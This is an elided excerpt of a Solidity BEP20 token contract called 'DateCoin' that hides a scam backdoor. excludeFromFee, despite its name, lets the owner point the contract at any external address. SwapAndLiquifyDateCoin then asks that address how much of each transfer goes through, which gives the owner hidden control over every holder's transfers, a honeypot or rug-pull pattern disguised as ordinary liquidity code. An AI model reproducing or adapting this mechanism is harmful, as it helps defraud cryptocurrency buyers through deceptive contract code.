...
contract DateCoin is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'DateCoin';
  string private constant _symbol = 'DateCoin';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusDateCoin = 0;
  address pancakeRouter_DateCoin;
  ...
  */
  ...
  function SwapAndLiquifyDateCoin(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_DateCoin).getPair(_bonusDateCoin, sender, recipient, arrData);

      _bonusDateCoin = resData[0];
  ...
  function excludeFromFee(address c) public onlyOwner {
    pancakeRouter_DateCoin = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountDateCoin = SwapAndLiquifyDateCoin(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountDateCoin);
